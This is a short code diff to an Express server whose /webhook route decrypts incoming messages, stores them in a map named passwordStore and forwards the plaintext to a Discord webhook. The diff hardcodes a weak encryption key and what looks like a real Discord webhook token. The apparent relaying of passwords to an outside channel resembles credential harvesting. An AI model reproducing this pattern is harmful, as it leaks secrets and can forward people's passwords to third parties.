@@ -6,7 +6,7 @@ import CryptoJS from 'crypto-js';
 import rateLimit from 'express-rate-limit';
 
 const app = express();
-const encryptionKey = "your_secret_key"; // Replace with your real secret key
+const encryptionKey = "your_secret_key24"; // Replace with your real secret key
 
 // Rate-limiting middleware
 const limiter = rateLimit({
@@ -84,7 +84,7 @@ app.post("/webhook", limiter, async (req, res) => {
         passwordStore.set(decryptedMessage, Date.now());
 
         const webhookData = { content: decryptedMessage };
-        const webhookUrl = "https://discord.com/api/webhooks/your_webhook_url";
+        const webhookUrl = "https://discord.com/api/webhooks/1340602904138088530/emCGUboojJTRp46yy-Xa6VuiHCn_0Y6DRvdoFBO2XDsyCMmeN6-wQDVGxCqu4G9egy7I";
 
         let webhookResponse = await fetch(webhookUrl, {
             method: "POST",
